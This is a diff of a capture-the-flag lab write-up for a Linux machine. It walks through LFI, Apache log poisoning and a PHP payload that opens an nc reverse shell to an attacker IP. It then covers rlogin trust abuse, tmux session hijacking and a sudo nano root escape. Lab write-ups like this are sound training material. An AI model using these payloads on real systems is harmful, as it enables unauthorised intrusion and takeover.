@@ -2,50 +2,56 @@
 
 <img width="1536" height="1024" alt="5325327" src="https://github.com/user-attachments/assets/3e4c78c4-45df-4e3a-bb36-b28a349b12db" />
 
-Difficulty: Easy<br>
-Machine: Linux<br>
-Write-Up made by Butlipan
+> **Difficulty:** Easy<br>
+> **OS:** Linux<br>
+> **Write-up by:** Butlipan
 
-Let’s start our journey by performing enumeration with nmap scan.
+## 🔍 Enumeration
+
+Let’s start our journey by performing enumeration with an Nmap scan.
 ```
 sudo nmap -sC -sV -A 10.129.234.130 -p-
 ```
 ![643788](https://github.com/user-attachments/assets/b2916b15-4cd8-4aa6-a3d7-e011a03b8542)
 
 We found:<br>
-Open SSH on port 22 -> Nothing interesting for now without creds. or identity file  
-HTTP on port 80 -> Apache with admin panel, potential attack vector<br>
-Rservices on ports 512,513 and 514 -> Rlogin, rsh, rexec<br>
+- **SSH (22):** Nothing interesting for now without credentials or an identity file
+- **HTTP (80):** Apache with admin panel, potential attack vector<br>
+- **R-services (512–514):** Rlogin, rsh, rexec<br>
 
 For now, let’s visit a site on port 80
 
+## 🌐 Web Exploitation
+
 <img width="729" height="447" alt="Screenshot 2026-01-06 at 20-34-50 Document 1-4 pdf" src="https://github.com/user-attachments/assets/39e2e9e2-9660-463b-a75f-e2c67140b243" />
 
-We are presented with admin panel. On first sight there nothing
-interesting there. I din’t find any hardcoded cred. in page source,
-also there wasn’t any suggestion which web app we are facing
-right now. I tried some basic username+passwords combos like
-admin – admin etc. And it also didn’t work. So we’ll try to use
-forgot password to find hopefully a existing user.
+At first sight, there was nothing interesting.
+I didn't find any hardcoded credentials in the page source,
+and there was no indication of which web application we were dealing with. I tried some basic username and password combinations such as
+admin:admin, but they didn’t work. So we’ll try to use
+forgot password to hopefully find an existing user.
 
 <img width="736" height="127" alt="Screenshot 2026-01-06 at 20-42-08 Document 1-4 pdf" src="https://github.com/user-attachments/assets/b9d2cf49-f6c2-4120-9e7f-a049d741ef9f" />
 
-Bingo! We found that admin is existing user. Now, we have two options:<br>
-1 -> Use BurpSuite to find nuance in site respond<br>
-2 -> Brute force with hydra<br>
+Bingo! We found that admin is an existing user. Now, we have two options:<br>
+- **Use Burp Suite to find nuances in the server response**<br>
+- **Brute force with hydra**<br>
 
 First we gonna check option 1. Burpsuite time!
 
 ![uPKrp-jB](https://github.com/user-attachments/assets/37483502-e7c0-4bd9-85a8-ca79431c30ca)
         
-As you see, option 2 now is invalid, we got a jackpot! In respond from the server we got a valid password for admin. Let’s verify that.
+In the server response, we obtained a valid password for the admin user. Let’s verify that.
 
 <img width="744" height="158" alt="Screenshot 2026-01-06 at 20-46-52 Document 1-4 pdf" src="https://github.com/user-attachments/assets/22567517-1574-43b9-91b4-617c3127eee1" />
 
 We’re in! We can see admin dashboard with option to see logs:<br>
--> Syslog<br>
--> Auth.log<br>
-But they are empty...
+- **Syslog**<br>
+- **Auth.log**<br>
+
+However, both logs were empty...
+
+## 🐚 Initial Foothold
 
 Let’s dig more!
 
@@ -55,8 +61,8 @@ In request, we can spot this line:
 ```
 file=%2Fvar%2Flog%2Fauth.log
 ```
-It can give us LFI if we find a weak spot. We can check this theory
-by reading apache log
+This could lead to an **LFI** vulnerability if a weak spot is present. We can check this theory
+by reading the Apache **access log**
 
 <img width="745" height="166" alt="Screenshot 2026-01-06 at 20-50-54 Document 1-4 pdf" src="https://github.com/user-attachments/assets/17fefe6e-64ba-4a83-ad98-4e7bcd83104d" />
 
@@ -65,7 +71,8 @@ for our advantage.
 
 ![6547848](https://github.com/user-attachments/assets/fde749f6-d4ba-4216-ae1f-13ab12d057ac)
 
-Nice, it seems like this log is saving our agent. What it means? We can do log poisoning and receive reverse shell. 
+It appears that this log stores our User-Agent header.
+What does this mean? We can do log poisoning and receive a reverse shell. 
 
 ![Bez nazwy jpgyreye](https://github.com/user-attachments/assets/3832470a-4b14-4773-9a97-2304d3dd0568)
 
@@ -73,35 +80,36 @@ I’ll use this and modify it for web purposes. The final payload is:<br>
 ```php
 <?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.204 4444 >/tmp/f'); ?>
 ```
-Now, setup listener
+Now, set up a listener:
 ```
-nc -lvnp 444
+nc -lvnp 4444
 ```
-<img width="435" height="89" alt="Screenshot 2026-01-06 at 21-01-14 Document 1-4 pdf" src="https://github.com/user-attachments/assets/948f66fb-3fc4-4ce5-afe1-1e2f5945a01c" />
-
 Time to attack!<br>
--> First, send payload in User-Agent to poinos log.<br>
+- **First** send the payload in the User-Agent header to poison the log<br>
 
 <img width="750" height="281" alt="Screenshot 2026-01-06 at 21-10-46 Document 1-4 pdf" src="https://github.com/user-attachments/assets/7173285c-bcd5-4b84-bd4e-feaf12107d02" />
 
--> Secondly, send our previous LFI payload
+- **Secondly** send our previous LFI payload
 
 <img width="571" height="138" alt="Screenshot 2026-01-06 at 21-11-19 Document 1-4 pdf" src="https://github.com/user-attachments/assets/0a46736b-794b-4793-a981-703761859de2" />
 
--> Pwned!
+- **Pwned!**
 
 <img width="744" height="252" alt="Screenshot 2026-01-06 at 21-11-50 Document 1-4 pdf" src="https://github.com/user-attachments/assets/158182d6-fd80-4dd0-b2b3-2fb661063a74" />
 
-Now, let's get better shell<br>
+Now, let's upgrade to a better shell<br>
 ```
 $ python3 -c 'import pty;pty.spawn("/bin/bash")'
 www-data@reset:/var/www/html$ export TERM=xterm
 ```
 We can now grab the first flag, the user.txt in /home/sadm
 ```
-www-data@reset:/var/www/html$ cat /home/sadm
+www-data@reset:/var/www/html$ cat /home/sadm/user.txt
 ```
-After spending some time for searching clues and occasions for lateral movement/priv. escalation I found ‘hosts.equiv’ in /etc. 
+
+## ⬆️ Privilege Escalation
+
+After spending some time searching for clues and opportunities for lateral movement/priv. escalation I found ‘hosts.equiv’ in /etc. 
 ```
 www-data@reset:/var/www/html$ cat /etc/hosts.equiv 
 # /etc/hosts.equiv: list  of  hosts  and  users  that are granted "trusted" r
@@ -119,9 +127,9 @@ $ rlogin 10.129.234.130
 sadm@reset:~$ whoami
 sadm
 ```
-We’re in! Time to find the way to escalte to root.  
-After searching for a while i found opned tmux session on our host
-We can check what tmux is hidding from us!
+We’re in! Time to find the way to escalate to root.  
+After searching for a while i found opened tmux session on our host
+We can check what tmux is hiding from us!
 
 ```
 sadm@reset:~$ ps aux
@@ -142,17 +150,20 @@ sadm@reset:~$ tmux attach -t sadm_session
 ```
 ![754859](https://github.com/user-attachments/assets/6eab381a-e30f-4842-979f-5a6297445594)
 
-It look like password to me! But, let‘s check our sudo first 
+It looks like password to me! But, let‘s check our sudo first 
 
 <img width="635" height="272" alt="Screenshot 2026-01-06 at 21-39-05 Document 1-4 pdf" src="https://github.com/user-attachments/assets/275e15e0-f41e-4e81-8d17-9aa59c8f588c" />
 
-Jackpot! I think we can now use firewall.sh to change our user to root. We’ll use nano to escalate our privileges.I’m gonna check GTFOBins to know how to do that properly
+Jackpot! I think we can now use firewall.sh to change our user to root. We’ll use nano to escalate our privileges. I checked [GTFOBins](https://gtfobins.github.io/) to confirm the proper exploitation technique.
 ```
 sudo nano
 ^R^X
 reset; sh 1>&0 2>&0
 ```
 We got root! Now, just claim your flag and enjoy your win 😊
+
+## 🏁 Root flag
+
 ```
 rootelp                                           M-F New Buffer                                    ^S Spell Check                                    ^J Full Justify                                   ^V Cut Till End
 # .                                               M-\ Pipe Text                                     ^Y Linter                                         ^O Formatter                                      ^Z Suspend
@@ -197,6 +208,7 @@ drwx------  2 root root 4096 Dec  6  2024 .ssh
 
 
  
+
 
 
 
